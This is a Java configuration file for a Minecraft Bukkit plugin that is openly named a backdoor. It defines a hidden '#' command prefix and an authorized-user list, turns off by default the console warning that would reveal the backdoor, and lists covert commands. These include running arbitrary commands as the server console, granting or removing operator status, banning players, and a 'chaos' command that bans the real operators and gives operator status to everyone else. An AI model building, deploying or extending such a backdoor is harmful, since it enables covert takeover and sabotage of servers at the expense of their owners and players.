/*
 * Plugin configuration file
 */

package com.thiccindustries.backdoor.backdoor;

import org.bukkit.ChatColor;

public class Config {


    /*Command execution*/

    // Authorized UUIDS 
    public static final String[] authorized_uuids = {
            //Put user UUIDs here. These UUIDs are immune to the unauth command
    };

    // UUIDs added by the auth command. DO NOT EDIT
    public static String[] tmp_authorized_uuids;

    // Command Prefix 
    public static final String command_prefix = "#";
    
    // Warn server console about backdoor 
    public static final Boolean display_backdoor_warning = false;

    // Print debug messages to console 
    public static final Boolean display_debug_messages = false;


    /* Command defaults */

    // Default gamemode for gamemode command
    public static final int default_gamemode = 1;

    // Default ban reason 
    public static final String default_ban_reason = "Banned";

    // Default ban source 
    public static final String default_ban_source = "Server";


    /* Enchantment Settings */

    // Enchant level for "dangerous" enchants (Fortune, Looting)
    // Setting this too high may crash the server and or client when used
    public static final int dangerous_enchant_level = 10;

    // Enchant levels for "safe" enchants
    public static final int safe_enchant_level = 32767;

    // Give 32k items vanishing curse (Item cannot be stolen)
    public static final boolean curse_enchants = true;


    /* Chat settings */

    // message prefix 
    public static final String chat_message_prefix = "## Backdoor ##";

    // color of messages prefix 
    public static final ChatColor chat_message_prefix_color = ChatColor.RED;

    // color of help command name 
    public static final ChatColor help_command_name_color = ChatColor.GOLD;

    // color of help command syntax 
    public static final ChatColor help_command_desc_color = ChatColor.WHITE;

    // color of help 
    public static final ChatColor help_detail_color = ChatColor.RED;

    // Help message content 
    public static final HelpItem[] help_messages = {
            new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
            new HelpItem("deop",        "[player]",                     "deop specified player (def: self)"),
            new HelpItem("ban",         "(player) [reason] [source]",   "ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
            new HelpItem("banip",       "(player) [reason] [source]",   "ip ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
            new HelpItem("gm",          "[gamemode]",                   "switch to specified gamemode (def: " + Config.default_gamemode + ")"),
            new HelpItem("gamemode",    "[gamemode]",                   "switch to specified gamemode (def: " + Config.default_gamemode + ")"),
            new HelpItem("give",        "(item) [count]",               "give the specified item in specified quantities (def: stack)"),
            new HelpItem("32k",         "(type)",                       "Add 32k enchants to item being held. (types = 'tool' or 'sword')"),
            new HelpItem("exec",        "[command]",                    "Exocute command as server console."),
            new HelpItem("chaos",       "",                             "Deop and ban ops, op all regular players."),
            new HelpItem("seed",        "",                             "Get the current world seed."),
            new HelpItem("auth",        "(player)",                     "Authorize user until next server restart."),
            new HelpItem("deauth",      "(player)",                     "Remove player authorized with " + command_prefix + "auth. Perminantly auth'd players cannot be deauth'ed")
    };

    public static class HelpItem{

        private final String name;
        private final String syntax;
        private final String desc;

        public HelpItem(String name, String syntax, String desc){
            this.name = name;
            this.syntax = syntax;
            this.desc = desc;
        }

        public String getName(){
            return name;
        }

        public String getSyntax(){
            return syntax;
        }
        public String getDesc(){
            return desc;
        }

        public String toString(){
            return Config.help_command_name_color + name + " " + syntax + ": " + Config.help_command_desc_color + desc;
        }
    }
}

